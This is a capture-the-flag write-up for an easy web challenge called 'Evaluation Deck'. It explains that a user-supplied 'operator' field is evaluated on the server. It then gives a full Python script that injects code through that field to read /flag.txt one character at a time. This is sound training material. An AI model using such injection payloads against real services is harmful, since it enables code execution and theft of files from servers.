# Evaluation Deck

![web](https://img.shields.io/badge/category-web-brightgreen) <br>
![difficulty](https://img.shields.io/badge/difficulty-easy-green) <br>
![solvetime](https://img.shields.io/badge/solved-durring%20event-green)

## Description

> A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

Provided files are:
- [All files](web_evaluation_deck)

## Solving process

Upon inspecting the source, we can se the user input for operator is evaluated and then summed up with other two arguments. We can exfiltrate flag letter by letter from the host machine:

```python
import requests

URL = "insert URL"
s = requests.Session()

r = s.get(URL)
def get_char(i):
    payload = {
        "current_health": "0",
        "attack_power": "0",
        "operator": "+ ord(open('/flag.txt', 'r').read()[{}]) +".format(i)
    }
    r=s.post(URL + "/api/get_health", json=payload)
    return r.json()["message"]
i = 0
while True:
    try:
        c=get_char(i)
        print(chr(c), end="")
        i +=1
    except:
        break
```

**Flag:** **
